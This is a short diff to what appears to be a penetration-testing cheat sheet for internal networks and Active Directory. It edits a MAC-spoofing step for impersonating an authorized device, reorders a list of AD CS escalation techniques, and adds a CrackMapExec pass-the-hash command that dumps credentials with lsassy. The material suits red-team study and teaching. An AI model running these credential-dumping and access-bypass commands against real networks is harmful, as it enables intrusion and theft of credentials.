@@ -12,7 +12,7 @@
 
 1. Spoof mac, static ip, gateway ip, from any authorized device \(e.g printer or voip phone\), and disconnect it: 
 ```sh
-macchanger -r eth0
+macchanger -m [MAC] [Interface]
 ```
 2. force your static IP to match the one that you spoofed the mac from : 
 ```sh
@@ -202,8 +202,8 @@ searchsploit <service_name>
 
 ```
 esc1 => abuse of a template-based vulnerability
-esc6 => abuse of vulnerability based on CA
 esc4 => abuse of a generic write (ACL) based vulnerability
+esc6 => abuse of vulnerability based on CA
 esc8 => relayx ntlm (attack can be played both with and without account)
 ```
 
@@ -310,6 +310,7 @@ Kerberos ticket, LM/NTLM hash or cleartext password with CrackMapExec or lsassy
 ```bash
 crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --lsa
 crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --sam
+crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> -M lsassy
 lsassy <target> -d <domain> -u <user> -p <pass>
 ```
 
